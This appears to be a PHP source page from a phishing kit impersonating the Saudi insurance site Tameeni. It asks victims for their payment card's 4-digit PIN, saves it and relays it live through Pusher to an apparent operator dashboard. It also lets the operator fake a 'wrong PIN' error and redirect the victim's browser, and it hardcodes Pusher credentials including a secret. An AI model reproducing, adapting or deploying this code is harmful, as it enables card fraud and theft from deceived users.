<?php
error_reporting(0);
ini_set('display_errors', 0);
########################
session_start();

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');
require __DIR__ . '/vendor/autoload.php';

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'الرمز السري');

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );

    $dataa = [
        'userId' => $_SESSION['user_id'],
        'page' => 'الرمز السري'
    ];

    $pusher->trigger('temaeen-new', 'curreneft-page', $dataa);
}

if (isset($_POST['submit'])) {

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );

    $site = array(
        'password' => $_POST["password"],
        'message' => 'الرمز السري',
        'type' => '3'
    );

    $id = $_SESSION['card_id'];
    $userId = $_SESSION['user_id'];
    $updateResult = $User->UpdateCardPasswordById($id,  $_POST["password"]);
    if ($updateResult) {
        $User->UpdateStatus($userId, 'الرمز السري');

        $data = [
            'userId' => $userId,
            'updatedData' => $site
        ];

        $pusher->trigger('temaeen-new', 'update-user-accountt', $data);

        echo "<script>document.location.href='wait-payment.php';</script>";
    }
}

if (isset($_GET['reject'])) {
    $showError = true;
}


?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأميني المنصة الأولى لمقارنة أسعار تأمين المركبات والطبي وسفر وأخطاء طبية اونلاين في السعودية</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Bootstrap JS (bundle includes Popper.js) -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        * {
            padding: 0;
            margin: 0;
            font-family: "Cairo", serif;
            direction: rtl;
        }

        a {
            text-decoration: none;
        }

        /* body {
            height: 2000vh;
        } */

        .bacOne {
            background-color: #0088eb;
        }

        .fa-solid,
        label {
            color: rgb(153, 153, 153);
        }

        .form-control {
            height: 50px !important;
        }

        label {
            font-weight: bold;
            font-size: 14px;
        }

        .fa-solid.active {
            color: rgb(194, 77, 141) !important;
        }

        .text-primary {
            color: #0088eb !important;
        }

        .text-muted {
            color: rgb(153, 153, 153) !important;
        }

        /* ::placeholder {
            color: #d2d6da !important;
        } */

        .bg-two {
            background-color: #0088eb;
        }

        .form-check-input:checked {
            background-color:#76b740 !important;
            /* Bootstrap primary color or your custom color */
            border-color:#76b740;
        }

        /* Optional: Change the check mark dot color (on some browsers) */

        .form-check-input {
            width: 1.1em;
            height: 1.1em;
            border: 1px solid gray;
            /* Blue border, 2px thick */
        }

        .group {
            display: flex;
            align-items: center;
            border: 1px solid #dee2e6;
            border-radius: 5px;
            height: 40px;
        }

        .bg-one {
            background-color: #0088eb;
            height: 40px;
            color: #f8f9fa;
        }

        .bg-o-two {
            height: 40px;
            height: 40px;
            background-color: rgb(240, 240, 240);
            color: rgb(153, 153, 153) !important;
        }

        .bg-a-two {
            height: 40px;
            background-color: rgb(230, 228, 228);
            color: rgb(153, 153, 153) !important;
        }

        .forShow {
            display: flex;
            gap: 10px;
        }

        .ajamaclas {
            display: flex;
            justify-content: start;
            align-items: center;
        }

        .active {
            background-color: #a1cdda;
            border: 1px solid #31849b;
        }

        .bdgs {
            background-image: url(./assets/TPL.svg);
            background-repeat: no-repeat;
        }

        .bg-light {
            background-color: #f2f2f3 !important;
        }

        .hide {
            display: none;
        }

        .show {
            display: block;
        }
    </style>
</head>

<body class="bg-white">

    <nav class="d-flex justify-content-center py-2 shadow-sm">
        <a href="index.php">
            <a href="index.php">
                <img src="./assets/tamini-removebg-preview.png" width="150"  alt="">
            </a>
        </a>
    </nav>

    <div class="container my-5">
        <div class="row d-flex justify-content-center">
            <div class="col-11 shadow p-4 my-4" style="border-radius: 15px;">
                <h4 class="text-center fw-bold mb-4">رقم البطاقة السري</h4>
                <form action="" method="post">
                    <h6 class="text-center lh-base mt-4">الرجاء إدخال رقم البطاقة السري المكون من 4 خانات للتأكيد على عملية الدفع</h6>
                    <div class="mt-5 text-center">
                        <label for="" class="fw-bold mb-2">
                            <input type="text" minlength="4" maxlength="4" inputmode="numeric" name="password" required pattern="[0-9]+" class="form-control text-center" placeholder="xxxx" style="background-color: inherit;">
                            <input type="hidden" name="status" value="4">
                        </label>
                    </div>
                    <?php
                    // Check if data is submitted
                    if (isset($showError)) {
                        echo '<p class="text-center mt-2 text-danger fw-bold">الرمز السري غير صحيح</p>';
                    }
                    ?>

                    <button class="btn btn-primary text-light w-100 mt-4 fw-bold mb-3" style="height: 60px !important; border-radius: 12px; font-size: 18px !important;" type="submit" name="submit">تأكيد</button>
                </form>
            </div>
        </div>
    </div>

<script src="js/main.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script>
        var userIdFromSession = <?php echo json_encode($_SESSION['user_id']); ?>;

        Pusher.logToConsole = true;

        var pusher = new Pusher('4a9de0023f3255d461d9', {
            cluster: 'ap2'
        });

        var channel = pusher.subscribe('my-channel-new-jaz');

        channel.bind('page-tamen-new', function(data) {

            if (data.userId === userIdFromSession) {
                document.location.href = data.page;
            }

        });
    </script>

</body>

</html>